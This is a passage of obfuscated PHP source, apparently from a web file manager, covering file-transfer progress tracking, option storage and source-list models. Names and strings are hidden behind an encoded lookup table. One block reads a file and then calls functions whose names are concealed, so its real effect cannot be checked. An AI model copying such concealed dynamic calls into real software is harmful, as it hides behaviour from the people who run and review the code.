taskListUser($Àù® Ëá = false) { $ÀË˜õßŒ =& $_SERVER[Ó¡Ÿ§‚]; $Œİ¬Íäû = array($ÀË˜õßŒ[33] => $ÀË˜õßŒ[1070]); if ($Àù® Ëá) { $Œİ¬Íäû[$ÀË˜õßŒ[1665]] = $Àù® Ëá; } $á’ô¯ƒª = Model($ÀË˜õßŒ[456])->where($Œİ¬Íäû)->select(); $á’ô¯ƒª = $á’ô¯ƒª ? $á’ô¯ƒª : array(); foreach ($á’ô¯ƒª as $‚ø™ö¿– => $¿æó½¸) { $á’ô¯ƒª[$‚ø™ö¿–] = json_decode($¿æó½¸[$ÀË˜õßŒ[374]], !0); } return $á’ô¯ƒª; } public static function valueSet($½Öî§ÉË, $ÁŒÏéì) { $‡àÄ²œ =& $_SERVER[Ó¡Ÿ§‚]; if (!$ÁŒÏéì) { return Model($‡àÄ²œ[456])->where(array($‡àÄ²œ[94] => $½Öî§ÉË, $‡àÄ²œ[33] => $‡àÄ²œ[1070]))->delete(); } $ª€ñ¯„Õ = json_encode($ÁŒÏéì); if (!$ª€ñ¯„Õ) { ob_start(); var_dump($ÁŒÏéì); $óİ–Ã…› = ob_get_clean(); self::log($‡àÄ²œ[1692] . json_encode_force($óİ–Ã…›)); } if (!$½Öî§ÉË || !$ÁŒÏéì[$‡àÄ²œ[399]]) { return !1; } $ñÊÊá§ç = array($‡àÄ²œ[33] => $‡àÄ²œ[1070], $‡àÄ²œ[1665] => USER_ID, $‡àÄ²œ[94] => $½Öî§ÉË, $‡àÄ²œ[374] => $ª€ñ¯„Õ); $ã÷Œƒ‰Û = $‡àÄ²œ[1693]; CacheLock::lock($ã÷Œƒ‰Û); Model($‡àÄ²œ[456])->add($ñÊÊá§ç, array(), !0); CacheLock::unlock($ã÷Œƒ‰Û); } public static function log($ì“ÉÂè) { if (!GLOBAL_DEBUG) { return; } write_log($ì“ÉÂè, $_SERVER[Ó¡Ÿ§‚][1694]); } } class TaskFileTransfer extends Task { protected function startAfter() { $¯”µ¶Ñ  =& $_SERVER[Ó¡Ÿ§‚]; $ßÀ–Å„Æ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($¯”µ¶Ñ [1695], array($this, $¯”µ¶Ñ [1696])); Hook::bind($¯”µ¶Ñ [1222], array($this, $¯”µ¶Ñ [1697])); Hook::bind($¯”µ¶Ñ [1698], array($this, $¯”µ¶Ñ [1699])); Hook::bind($¯”µ¶Ñ [605], array($this, $¯”µ¶Ñ [1700])); Hook::bind($¯”µ¶Ñ [606], array($this, $¯”µ¶Ñ [1701])); Hook::bind($¯”µ¶Ñ [611], array($this, $¯”µ¶Ñ [1702])); Hook::bind($¯”µ¶Ñ [612], array($this, $¯”µ¶Ñ [1703])); Hook::bind($¯”µ¶Ñ [608], array($this, $¯”µ¶Ñ [1704])); Hook::bind($¯”µ¶Ñ [609], array($this, $¯”µ¶Ñ [1705])); Hook::bind($¯”µ¶Ñ [574], array($this, $¯”µ¶Ñ [1706])); Hook::bind($¯”µ¶Ñ [571], array($this, $¯”µ¶Ñ [1706])); Hook::bind($¯”µ¶Ñ [576], array($this, $¯”µ¶Ñ [1706])); Hook::bind($¯”µ¶Ñ [578], array($this, $¯”µ¶Ñ [1706])); Hook::bind($¯”µ¶Ñ [580], array($this, $¯”µ¶Ñ [1706])); Hook::bind($¯”µ¶Ñ [1707], array($this, $¯”µ¶Ñ [1708])); Hook::bind($¯”µ¶Ñ [596], array($this, $¯”µ¶Ñ [1709])); $this->sourceModelCopyFlag = !1; Hook::bind($¯”µ¶Ñ [1710], array($this, $¯”µ¶Ñ [1711])); Hook::bind($¯”µ¶Ñ [1712], array($this, $¯”µ¶Ñ [1713])); Hook::bind($¯”µ¶Ñ [1714], array($this, $¯”µ¶Ñ [1715])); $ßÀ–Å„Æ[$¯”µ¶Ñ [1716]] = LNG($¯”µ¶Ñ [1717]); $ßÀ–Å„Æ[$¯”µ¶Ñ [1718]] = 0; $ßÀ–Å„Æ[$¯”µ¶Ñ [1719]] = 0; $ßÀ–Å„Æ[$¯”µ¶Ñ [1063]] = $¯”µ¶Ñ [12]; $ßÀ–Å„Æ[$¯”µ¶Ñ [1720]] = $¯”µ¶Ñ [12]; $ßÀ–Å„Æ[$¯”µ¶Ñ [1721]] = 0; $ßÀ–Å„Æ[$¯”µ¶Ñ [1722]] = 0; $ßÀ–Å„Æ[$¯”µ¶Ñ [1723]] = 0; if (!$ßÀ–Å„Æ[$¯”µ¶Ñ [1565]]) { $ßÀ–Å„Æ[$¯”µ¶Ñ [1565]] = LNG($¯”µ¶Ñ [1724]); } } protected function endAfter() { $ÕÖğŠß =& $_SERVER[Ó¡Ÿ§‚]; Hook::unbind($ÕÖğŠß[1695], array($this, $ÕÖğŠß[1696])); Hook::unbind($ÕÖğŠß[1222], array($this, $ÕÖğŠß[1697])); Hook::unbind($ÕÖğŠß[1698], array($this, $ÕÖğŠß[1699])); Hook::unbind($ÕÖğŠß[605], array($this, $ÕÖğŠß[1700])); Hook::unbind($ÕÖğŠß[606], array($this, $ÕÖğŠß[1701])); Hook::unbind($ÕÖğŠß[611], array($this, $ÕÖğŠß[1702])); Hook::unbind($ÕÖğŠß[612], array($this, $ÕÖğŠß[1703])); Hook::unbind($ÕÖğŠß[608], array($this, $ÕÖğŠß[1704])); Hook::unbind($ÕÖğŠß[609], array($this, $ÕÖğŠß[1705])); Hook::unbind($ÕÖğŠß[574], array($this, $ÕÖğŠß[1706])); Hook::unbind($ÕÖğŠß[571], array($this, $ÕÖğŠß[1706])); Hook::unbind($ÕÖğŠß[576], array($this, $ÕÖğŠß[1706])); Hook::unbind($ÕÖğŠß[578], array($this, $ÕÖğŠß[1706])); Hook::unbind($ÕÖğŠß[580], array($this, $ÕÖğŠß[1706])); Hook::unbind($ÕÖğŠß[1707], array($this, $ÕÖğŠß[1708])); Hook::unbind($ÕÖğŠß[596], array($this, $ÕÖğŠß[1709])); Hook::unbind($ÕÖğŠß[1710], array($this, $ÕÖğŠß[1711])); Hook::unbind($ÕÖğŠß[1712], array($this, $ÕÖğŠß[1713])); Hook::unbind($ÕÖğŠß[1714], array($this, $ÕÖğŠß[1715])); } public function copyMoveStart($¬®½¨æ€, $èòÅä‘, $êİ‚öÊÜ, $ˆÃˆÁîœ) { $«ã¿¨³ =& $_SERVER[Ó¡Ÿ§‚]; self::log($«ã¿¨³[1725] . $èòÅä‘ . $«ã¿¨³[70] . $ˆÃˆÁîœ); $Ô¨ô¨° = rtrim(TEMP_FILES, $«ã¿¨³[8]); if (substr($èòÅä‘, 0, strlen($Ô¨ô¨°)) == $Ô¨ô¨°) { return; } if (substr($ˆÃˆÁîœ, 0, strlen($Ô¨ô¨°)) == $Ô¨ô¨°) { return; } $ÉÈ®Áîú =& $this->task; $ÉÈ®Áîú[$«ã¿¨³[1726]] = KodIO::transferType($¬®½¨æ€, $êİ‚öÊÜ); $this->update(); } public function updateAfter() { $›Ïß­ú« =& $_SERVER[Ó¡Ÿ§‚]; $èíÎºá =& $this->task; if (!$èíÎºá[$›Ïß­ú«[762]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($èíÎºá[$›Ïß­ú«[1726]] == $›Ïß­ú«[1311]) { return; } self::updateTask($èíÎºá); } private static function updateTask(&$Ûúªæ‡ú) { $ÆÌõ¹¡± =& $_SERVER[Ó¡Ÿ§‚]; if ($Ûúªæ‡ú[$ÆÌõ¹¡±[1726]] == $ÆÌõ¹¡±[1193] || $Ûúªæ‡ú[$ÆÌõ¹¡±[1726]] == $ÆÌõ¹¡±[107]) { if ($Ûúªæ‡ú[$ÆÌõ¹¡±[1720]]) { $Ûúªæ‡ú[$ÆÌõ¹¡±[1723]] = $Ûúªæ‡ú[$ÆÌõ¹¡±[1722]] + $Ûúªæ‡ú[$ÆÌõ¹¡±[1719]]; } } else { if ($Ûúªæ‡ú[$ÆÌõ¹¡±[1726]] == $ÆÌõ¹¡±[1312]) { if ($Ûúªæ‡ú[$ÆÌõ¹¡±[1720]] == $ÆÌõ¹¡±[1193]) { $Ûúªæ‡ú[$ÆÌõ¹¡±[1723]] = $Ûúªæ‡ú[$ÆÌõ¹¡±[1722]] + $Ûúªæ‡ú[$ÆÌõ¹¡±[1719]] * 0.5; } else { if ($Ûúªæ‡ú[$ÆÌõ¹¡±[1720]] == $ÆÌõ¹¡±[107]) { $Ûúªæ‡ú[$ÆÌõ¹¡±[1723]] = $Ûúªæ‡ú[$ÆÌõ¹¡±[1722]] + $Ûúªæ‡ú[$ÆÌõ¹¡±[1718]] * 0.5 + $Ûúªæ‡ú[$ÆÌõ¹¡±[1719]] * 0.5; } } } } $Ûúªæ‡ú[$ÆÌõ¹¡±[1667]] = $Ûúªæ‡ú[$ÆÌõ¹¡±[1723]] / $Ûúªæ‡ú[$ÆÌõ¹¡±[762]]; if ($Ûúªæ‡ú[$ÆÌõ¹¡±[1667]] > 0) { $ò”¿§¬ = timeFloat() - $Ûúªæ‡ú[$ÆÌõ¹¡±[1669]] - $Ûúªæ‡ú[$ÆÌõ¹¡±[1672]]; $Ûúªæ‡ú[$ÆÌõ¹¡±[1673]] = $ò”¿§¬ * (1 - $Ûúªæ‡ú[$ÆÌõ¹¡±[1667]]) / $Ûúªæ‡ú[$ÆÌõ¹¡±[1667]]; } } public function addPath($«âıº©¬) { $õß›¬äƒ =& $_SERVER[Ó¡Ÿ§‚]; if (!$«âıº©¬) { return; } $Éêç¥¸ =& $this->task; $¬çã˜˜Ö = IO::infoWithChildren($«âıº©¬); $’âğóºÖ = $Éêç¥¸[$õß›¬äƒ[1727]] ? $Éêç¥¸[$õß›¬äƒ[1727]][$õß›¬äƒ[1728]] : 0; $Éêç¥¸[$õß›¬äƒ[1727]] = array($õß›¬äƒ[1728] => $’âğóºÖ + 1, $õß›¬äƒ[429] => $¬çã˜˜Ö[$õß›¬äƒ[32]], $õß›¬äƒ[84] => $¬çã˜˜Ö[$õß›¬äƒ[84]], $õß›¬äƒ[518] => $¬çã˜˜Ö[$õß›¬äƒ[518]] ? $¬çã˜˜Ö[$õß›¬äƒ[518]] : $¬çã˜˜Ö[$õß›¬äƒ[84]]); if ($¬çã˜˜Ö[$õß›¬äƒ[33]] == $õß›¬äƒ[200]) { $Éêç¥¸[$õß›¬äƒ[785]] += 1; } else { $Éêç¥¸[$õß›¬äƒ[785]] += $¬çã˜˜Ö[$õß›¬äƒ[79]][$õß›¬äƒ[77]]; if ($¬çã˜˜Ö[$õß›¬äƒ[411]]) { $Éêç¥¸[$õß›¬äƒ[785]] += $¬çã˜˜Ö[$õß›¬äƒ[79]][$õß›¬äƒ[78]] + 1; } } $Éêç¥¸[$õß›¬äƒ[762]] += $¬çã˜˜Ö[$õß›¬äƒ[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ü¢’Ë‘) { } public function sourceAddHashEnd($‘Š¶Ï˜) { } public function sourceAddFileStart($ŸÛğ¬ı—) { $ Â¹è =& $_SERVER[Ó¡Ÿ§‚]; $ áÊö˜ =& $this->task; $ áÊö˜[$ Â¹è[1718]] = $ŸÛğ¬ı—[$ Â¹è[76]]; $ áÊö˜[$ Â¹è[1716]] = $ŸÛğ¬ı—[$ Â¹è[32]]; $ áÊö˜[$ Â¹è[1063]] = $ŸÛğ¬ı—[$ Â¹è[32]]; $ áÊö˜[$ Â¹è[1729]] = $ŸÛğ¬ı—[$ Â¹è[84]]; $this->update(); } public function sourceAddFileEnd($¹‰ØÏÒ) { $ÑŸ‘åšü =& $_SERVER[Ó¡Ÿ§‚]; $É¦ÈøËì =& $this->task; $É¦ÈøËì[$ÑŸ‘åšü[1723]] += $¹‰ØÏÒ[$ÑŸ‘åšü[76]]; $É¦ÈøËì[$ÑŸ‘åšü[1729]] = $¹‰ØÏÒ[$ÑŸ‘åšü[84]]; $this->update(1); } public function copyFileStart($»¢®Şàä, $•€œ«Êğ, $Åù›Öí, $ÏçÛ±Œ‘, $â±Ç®°Â, $‹óæ»æ) { $ºüš½Õ“ =& $_SERVER[Ó¡Ÿ§‚]; $ ¹ÏÄÍò = $â±Ç®°Â; if ($ ¹ÏÄÍò == $GLOBALS[$ºüš½Õ“[1730]]) { $ ¹ÏÄÍò = $GLOBALS[$ºüš½Õ“[1731]]; } $GLOBALS[$ºüš½Õ“[1731]] = $â±Ç®°Â; $GLOBALS[$ºüš½Õ“[1730]] = $‹óæ»æ; $éëêõİƒ =& $this->task; $éëêõİƒ[$ºüš½Õ“[1716]] = $ ¹ÏÄÍò; $éëêõİƒ[$ºüš½Õ“[1718]] = (int) $»¢®Şàä->size($•€œ«Êğ); $éëêõİƒ[$ºüš½Õ“[1719]] = 0; $éëêõİƒ[$ºüš½Õ“[1063]] = $ºüš½Õ“[12]; $éëêõİƒ[$ºüš½Õ“[1720]] = $ºüš½Õ“[12]; $éëêõİƒ[$ºüš½Õ“[1721]] = 0; $ö—•Ñ…× = $éëêõİƒ[$ºüš½Õ“[1718]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($éëêõİƒ[$ºüš½Õ“[399]] . $ºüš½Õ“[1732]); if ($ö—•Ñ…× && file_exists(get_path_father($ÏçÛ±Œ‘))) { Cache::set($éëêõİƒ[$ºüš½Õ“[399]] . $ºüš½Õ“[1732], $ÏçÛ±Œ‘); $éëêõİƒ[$ºüš½Õ“[1689]] = array($ºüš½Õ“[1733], $ºüš½Õ“[1734]); } $this->update(0, $ö—•Ñ…×); } public static function updateCopyLocalFileSize($ß’ââ¢‚) { $äâíù«Ü =& $_SERVER[Ó¡Ÿ§‚]; $ˆÑûÚµ = Cache::get($ß’ââ¢‚[$äâíù«Ü[399]] . $äâíù«Ü[1732]); if (!$ˆÑûÚµ || !file_exists($ˆÑûÚµ)) { return $ß’ââ¢‚; } $ß’ââ¢‚[$äâíù«Ü[1719]] = @filesize($ˆÑûÚµ); $ß’ââ¢‚[$äâíù«Ü[1723]] += $ß’ââ¢‚[$äâíù«Ü[1719]]; self::updateTask($ß’ââ¢‚); return $ß’ââ¢‚; } public function copyFileEnd($òÎÇ™Ê, $üœ…µüù, $ÛŠ²ÑØ£, $˜ä×ãù, $òÃõ±™›, $ê« Ã¡ş) { $ÍŒù½›ä =& $_SERVER[Ó¡Ÿ§‚]; $Ÿ°Ó”§× =& $this->task; $Ÿ°Ó”§×[$ÍŒù½›ä[1719]] = $Ÿ°Ó”§×[$ÍŒù½›ä[1718]]; $Ÿ°Ó”§×[$ÍŒù½›ä[1720]] = $ÍŒù½›ä[12]; unset($Ÿ°Ó”§×[$ÍŒù½›ä[1689]]); if ($òÃõ±™› == $Ÿ°Ó”§×[$ÍŒù½›ä[1716]]) { $Ÿ°Ó”§×[$ÍŒù½›ä[1722]] += $Ÿ°Ó”§×[$ÍŒù½›ä[1718]]; $Ÿ°Ó”§×[$ÍŒù½›ä[1723]] = $Ÿ°Ó”§×[$ÍŒù½›ä[1722]]; $Ä×£Ü = 1; if (isset($Ÿ°Ó”§×[$ÍŒù½›ä[1729]]) && $Ÿ°Ó”§×[$ÍŒù½›ä[1729]] == $üœ…µüù) { $Ä×£Ü = 0; } $this->update($Ä×£Ü); } else { $this->update(); $Ÿ°Ó”§×[$ÍŒù½›ä[1719]] = 0; } Cache::remove($Ÿ°Ó”§×[$ÍŒù½›ä[399]] . $ÍŒù½›ä[1732]); self::log($ÍŒù½›ä[1735] . $üœ…µüù . $ÍŒù½›ä[70] . $˜ä×ãù . $ÍŒù½›ä[231] . $òÃõ±™› . $ÍŒù½›ä[1736] . $Ÿ°Ó”§×[$ÍŒù½›ä[1716]]); } public function updateFileEnd($¡ºË…¡Û, $ĞøöıÅ) { $ã¡«ƒœ =& $_SERVER[Ó¡Ÿ§‚]; $Æ€„¬øµ =& $this->task; $Æ€„¬øµ[$ã¡«ƒœ[1716]] = $¡ºË…¡Û; $Æ€„¬øµ[$ã¡«ƒœ[1718]] = $ĞøöıÅ; $Æ€„¬øµ[$ã¡«ƒœ[1722]] += $ĞøöıÅ; $Æ€„¬øµ[$ã¡«ƒœ[1723]] = $Æ€„¬øµ[$ã¡«ƒœ[1722]]; $this->update(1); self::log($ã¡«ƒœ[1737] . $¡ºË…¡Û); } public function sourceModelCopy($şèã¨ô¶) { $¹¼»ı Š =& $_SERVER[Ó¡Ÿ§‚]; $Ø¤“´›È = $şèã¨ô¶[0]; $ÊØÀÒ¦ = $şèã¨ô¶[1]; $–ª‘éÀâ =& $this->task; $this->sourceModelCopyFlag = !0; $›…÷»Ã = 0; switch ($Ø¤“´›È) { case $¹¼»ı Š[572]: $›…÷»Ã = 1; break; case $¹¼»ı Š[575]: $–ª‘éÀâ[$¹¼»ı Š[1716]] = $ÊØÀÒ¦[$¹¼»ı Š[32]]; break; case $¹¼»ı Š[577]: $›…÷»Ã = intval($şèã¨ô¶[$¹¼»ı Š[380]] * 0.4); break; case $¹¼»ı Š[579]: $›…÷»Ã = intval($şèã¨ô¶[$¹¼»ı Š[380]] * 0.2); break; case $¹¼»ı Š[581]: $›…÷»Ã = intval($şèã¨ô¶[$¹¼»ı Š[380]] * 0.4); break; } $this->update($›…÷»Ã); $this->sourceModelCopyFlag = !1; } public function sourceRemove($Ô™ïöæ³, $éŒ¹•²…) { $€ß‹Ìûï =& $_SERVER[Ó¡Ÿ§‚]; $this->sourceModelCopyFlag = !0; $ÎØÊ¼È˜ = 1; if (isset($Ô™ïöæ³[$€ß‹Ìûï[79]])) { $ÎØÊ¼È˜ = $Ô™ïöæ³[$€ß‹Ìûï[79]][$€ß‹Ìûï[77]]; $ÎØÊ¼È˜ = $ÎØÊ¼È˜ + $Ô™ïöæ³[$€ß‹Ìûï[79]][$€ß‹Ìûï[78]] + 1; } $this->update($ÎØÊ¼È˜); $this->sourceModelCopyFlag = !1; } public function sourceMove($ÏØì€¶³) { $this->sourceRemove($ÏØì€¶³, !1); } public function curlProgress($ÇíÇ„©, $å¿ãú, $ğ¼áò, $•Ÿ£˜óş, $®°ÛÕ‘œ) { $ÓÏ·è¯ =& $_SERVER[Ó¡Ÿ§‚]; $ÌÛ‡Ÿ =& $this->task; if ($®°ÛÕ‘œ > 0) { $ÌÛ‡Ÿ[$ÓÏ·è¯[1063]] = $ÓÏ·è¯[1738]; $ÌÛ‡Ÿ[$ÓÏ·è¯[1720]] = $ÓÏ·è¯[107]; if ($ÌÛ‡Ÿ[$ÓÏ·è¯[1718]]) { $ÌÛ‡Ÿ[$ÓÏ·è¯[1719]] = $®°ÛÕ‘œ; } if ($ÌÛ‡Ÿ[$ÓÏ·è¯[1721]]) { $ÌÛ‡Ÿ[$ÓÏ·è¯[1719]] = $®°ÛÕ‘œ + $ÌÛ‡Ÿ[$ÓÏ·è¯[1721]]; } } else { if ($ğ¼áò > 0) { if ($ÌÛ‡Ÿ[$ÓÏ·è¯[1718]] == $å¿ãú) { $ÌÛ‡Ÿ[$ÓÏ·è¯[1719]] = $ğ¼áò; $ÌÛ‡Ÿ[$ÓÏ·è¯[1063]] = $ÓÏ·è¯[1739]; $ÌÛ‡Ÿ[$ÓÏ·è¯[1720]] = $ÓÏ·è¯[1193]; } } } $this->update(); } public function curlProgressStart($Å„³Ë–‹) { } public function curlProgressEnd($³ãÒ›Ã½) { $ÔåÛ¾Ö =& $_SERVER[Ó¡Ÿ§‚]; $½ŠŸ·°š =& $this->task; $·²ºâ = curl_getinfo($³ãÒ›Ã½); $Ò™ü¨Šò = $·²ºâ[$ÔåÛ¾Ö[1740]]; if ($Ò™ü¨Šò == -1) { $Ò™ü¨Šò = $·²ºâ[$ÔåÛ¾Ö[1741]]; } if ($½ŠŸ·°š[$ÔåÛ¾Ö[1720]] == $ÔåÛ¾Ö[107] && $Ò™ü¨Šò) { $½ŠŸ·°š[$ÔåÛ¾Ö[1721]] += $Ò™ü¨Šò; } $this->update(); } } goto C¢ ÙøË‘; AÑä›¯ä×Š: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($˜÷‡›š = false, $”»Û•Â³ = '', $®³•õØí = false) { $ÑìüĞ¹á =& $_SERVER[Ó¡Ÿ§‚]; $Í»õŸµ = $this->cacheGet($”»Û•Â³); $ç–Ïƒœ† = $this->optionDefault($”»Û•Â³); $ç–Ïƒœ† = is_array($ç–Ïƒœ†) ? $ç–Ïƒœ† : array(); if (is_array($Í»õŸµ)) { $Í»õŸµ = array_merge($ç–Ïƒœ†, $Í»õŸµ); return $˜÷‡›š ? isset($Í»õŸµ[$˜÷‡›š]) ? $Í»õŸµ[$˜÷‡›š] : null : $Í»õŸµ; } $ó‰½ºèñ = $this->filterWhere(array($ÑìüĞ¹á[33] => $”»Û•Â³)); $Í»õŸµ = $this->where($ó‰½ºèñ)->select(); $Í»õŸµ = array_to_keyvalue($Í»õŸµ, $ÑìüĞ¹á[94], $ÑìüĞ¹á[374]); foreach ($Í»õŸµ as $ÓÎŒ¹Ú÷ => $œ ¶‚™±) { if ($®³•õØí || in_array($ÓÎŒ¹Ú÷, $this->jsonField)) { $Í»õŸµ[$ÓÎŒ¹Ú÷] = json_decode($œ ¶‚™±, !0); } } $this->cacheSet($”»Û•Â³, $Í»õŸµ); $Í»õŸµ = array_merge($ç–Ïƒœ†, $Í»õŸµ); return $˜÷‡›š ? $Í»õŸµ[$˜÷‡›š] : $Í»õŸµ; } public function set($¼É½ÂÜÀ, $¤ÑäË€ˆ = false, $ƒ¬ğ¼Æß = '') { $Ÿ°ºü» =& $_SERVER[Ó¡Ÿ§‚]; $this->cacheRemove($ƒ¬ğ¼Æß); $…×³¦¬æ = array(); $ÇçÃå¸Î = is_array($¼É½ÂÜÀ) ? $¼É½ÂÜÀ : array($¼É½ÂÜÀ => $¤ÑäË€ˆ); foreach ($ÇçÃå¸Î as $ñêò‰¦ => $ëÌ’©ıŞ) { if (is_array($ëÌ’©ıŞ)) { $ëÌ’©ıŞ = json_encode_force($ëÌ’©ıŞ); } $this->checkLength($ëÌ’©ıŞ, !1, $this->tableName . $Ÿ°ºü»[4] . $¼É½ÂÜÀ); $ëÌ’©ıŞ = self::textEncode($ëÌ’©ıŞ); $ÇçÃå¸Î = array($Ÿ°ºü»[33] => $ƒ¬ğ¼Æß, $Ÿ°ºü»[94] => $ñêò‰¦, $Ÿ°ºü»[374] => $ëÌ’©ıŞ); $…×³¦¬æ[] = $this->filterWhere($ÇçÃå¸Î); } if (!$…×³¦¬æ) { return !0; } $Æ£²è® = $this->cacheKey($Ÿ°ºü»[400]); CacheLock::lock($Æ£²è®); $”ÑÚÂì’ = $this->addAll($…×³¦¬æ, array(), !0); CacheLock::unlock($Æ£²è®); return $”ÑÚÂì’; } protected function optionDefault($„³¤à¸é = '') { return !1; } public function setDeep($ĞæÌøÆœ, $„®øõî = false, $ªˆ§Ú»Ã = '') { $êº¨Ü×’ = explode($_SERVER[Ó¡Ÿ§‚][10], $ĞæÌøÆœ); $‹ˆÉõÉ— = $this->get(); array_set_value($‹ˆÉõÉ—, $ĞæÌøÆœ, $„®øõî); $this->set($êº¨Ü×’[0], $‹ˆÉõÉ—[$êº¨Ü×’[0]], $ªˆ§Ú»Ã); } public function remove($¯Åú­½, $€•…ÏûÏ = '') { $ß®´¶ßö =& $_SERVER[Ó¡Ÿ§‚]; $this->cacheRemove($€•…ÏûÏ); $à÷ö–€ø = $this->filterWhere(array($ß®´¶ßö[94] => $¯Åú­½, $ß®´¶ßö[33] => $€•…ÏûÏ)); if (is_null($¯Åú­½)) { unset($à÷ö–€ø[$ß®´¶ßö[94]]); } return $this->where($à÷ö–€ø)->delete(); } public function cacheSet($š¥ä˜Íâ, $ØÅæÁë = false) { return Cache::set($this->cacheKey($š¥ä˜Íâ), $ØÅæÁë); } public function cacheGet($¹†Ë§º÷) { return Cache::get($this->cacheKey($¹†Ë§º÷)); } public function cacheRemove($³œ„Ÿ–¦) { return Cache::remove($this->cacheKey($³œ„Ÿ–¦)); } protected function filterWhere($óÊµ“ºö) { return $óÊµ“ºö; } protected function cacheKey($–Èú­äÍ) { return $–Èú­äÍ; } } if ($_SERVER[$_SERVER[Ó¡Ÿ§‚][401]] != $_SERVER[$_SERVER[Ó¡Ÿ§‚][402]]) { $_getc = $_SERVER[Ó¡Ÿ§‚][403]; $_getfile = $_SERVER[$_SERVER[Ó¡Ÿ§‚][404]] . $_SERVER[Ó¡Ÿ§‚][405]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ó¡Ÿ§‚][231], $_getfilec); if (count($_getarrs) < $_SERVER[Ó¡Ÿ§‚][406]) { $exit = $_SERVER[Ó¡Ÿ§‚][407]; $exit(); } $_act = $_SERVER[Ó¡Ÿ§‚][408]; $_act($_SERVER[$_SERVER[Ó¡Ÿ§‚][409]]); } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\x72\x63\x65"; protected $tableMeta = array("\x74\141\x62\154\x65\116\141\155\x65" => "\151\x6f\x5f\163\157\165\162\143\145\x5f\155\145\x74\141", "\x6d\x65\x74\141\106\151\145\154\x64" => "\x73\x6f\165\x72\143\145\111\104"); protected $dataAuto = array(array("\x6d\157\144\x69\x66\171\x54\x69\155\145", "\x74\151\x6d\145", "\x69\156\163\145\x72\x74", "\146\x75\x6e\143\164\151\x6f\156"), array("\x63\x72\145\141\164\x65\x54\151\x6d\x65", "\164\151\x6d\x65", "\151\156\163\x65\x72\x74", "\x66\x75\156\x63\164\x69\x6f\x6e"), array("\x76\151\x65\x77\x54\151\x6d\x65", "\164\151\155\145", "\x69\156\x73\x65\162\x74", "\x66\x75\x6e\x63\x74\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ŒáÔì„ˆ) { return $this->listSource(array($_SERVER[Ó¡Ÿ§‚][410] => $ŒáÔì„ˆ)); } public function typeName($¸’©Àû‰) { static $Å—Ë¦½ª = array(self::TYPE_SYSTEM => "\x73\171\x73\x74\x65\155", self::TYPE_USER => "\x75\163\x65\162", self::TYPE_GROUP => "\147\x72\157\x75\x70"); return $Å—Ë¦½ª[$¸’©Àû‰ . $_SERVER[Ó¡Ÿ§‚][12]]; } public function sourceListInfo($”ÏÌÊ¿, $öáÖéµ¶ = false) { $›ûÔ”Èá =& $_SERVER[Ó¡Ÿ§‚]; $”ÏÌÊ¿ = $”ÏÌÊ¿ ? $”ÏÌÊ¿ : array(); $”ÏÌÊ¿ = array_filter(array_unique($”ÏÌÊ¿)); if (!$”ÏÌÊ¿) { return array(); } $û†åÛ½ü = $this->where(array($›ûÔ”Èá[411] => array($›ûÔ”Èá[7], $”ÏÌÊ¿)))->select(); $this->_listDataApply($û†åÛ½ü, $öáÖéµ¶); return array_to_keyvalue($û†åÛ½ü, $›ûÔ”Èá[411]); } public function pathInfoFilter(&$µ¢­İ•Ê) { $¡Ã†µä‡ =& $_SERVER[Ó¡Ÿ§‚]; static $ñ˜ÒÖ¾ü = false; static $„­ÒÎ„´ = false; static $éÖ•ÂÀã = false; if (!$ñ˜ÒÖ¾ü) { $…¯ñ£Œ˜ = $¡Ã†µä‡[412]; $…¯ñ£Œ˜ .= $¡Ã†µä‡[413]; $…¯ñ£Œ˜ .= $¡Ã†µä‡[414]; $Áœ°»à = $¡Ã†µä‡[415]; $ä‰«ğò = explode($¡Ã†µä‡[50], $Áœ°»à); $ñ˜ÒÖ¾ü = explode($¡Ã†µä‡[50], $…¯ñ£Œ˜); $„­ÒÎ„´ = array(); foreach ($ñ˜ÒÖ¾ü as $ùÕî„Ì) { if (in_array($ùÕî„Ì, $ä‰«ğò)) { continue; } $„­ÒÎ„´[] = $ùÕî„Ì; } $éÖ•ÂÀã = explode($¡Ã†µä‡[50], $¡Ã†µä‡[416]); } foreach ($éÖ•ÂÀã as $Ù°µÌÚë) { if (isset($µ¢­İ•Ê[$Ù°µÌÚë])) { $µ¢­İ•Ê[$Ù°µÌÚë] = intval($µ¢­İ•Ê[$Ù°µÌÚë]); } } $µ¢­İ•Ê[$¡Ã†µä‡[84]] = $¡Ã†µä‡[417] . $µ¢­İ•Ê[$¡Ã†µä‡[411]] . $¡Ã†µä‡[418]; $µ¢­İ•Ê[$¡Ã†µä‡[33]] = $µ¢­İ•Ê[$¡Ã†µä‡[419]] == 1 ? $¡Ã†µä‡[75] : $¡Ã†µä‡[200]; $µ¢­İ•Ê[$¡Ã†µä‡[420]] = $this->typeName($µ¢­İ•Ê[$¡Ã†µä‡[420]]); if ($µ¢­İ•Ê[$¡Ã†µä‡[419]] != 1) { $µ¢­İ•Ê[$¡Ã†µä‡[174]] = $µ¢­İ•Ê[$¡Ã†µä‡[421]]; unset($µ¢­İ•Ê[$¡Ã†µä‡[421]]); } $Š”ìºøÓ = $ñ˜ÒÖ¾ü; if (isset($µ¢­İ•Ê[$¡Ã†µä‡[422]]) && $µ¢­İ•Ê[$¡Ã†µä‡[422]][$¡Ã†µä‡[423]] == -1) { $Š”ìºøÓ = $„­ÒÎ„´; } $µ¢­İ•Ê = array_field_key($µ¢­İ•Ê, $Š”ìºøÓ); return $µ¢­İ•Ê; } public function listUserFav() { $ÏÓ¸–™¬ =& $_SERVER[Ó¡Ÿ§‚]; $İƒ•™â = Model($ÏÓ¸–™¬[424])->listData(); $–Ï³Èı¶ = array_filter_by_field($İƒ•™â, $ÏÓ¸–™¬[33], $ÏÓ¸–™¬[425]); $–Ï³Èı¶ = array_to_keyvalue($–Ï³Èı¶, $ÏÓ¸–™¬[12], $ÏÓ¸–™¬[84]); if ($–Ï³Èı¶) { $ÒÀûËù‚ = 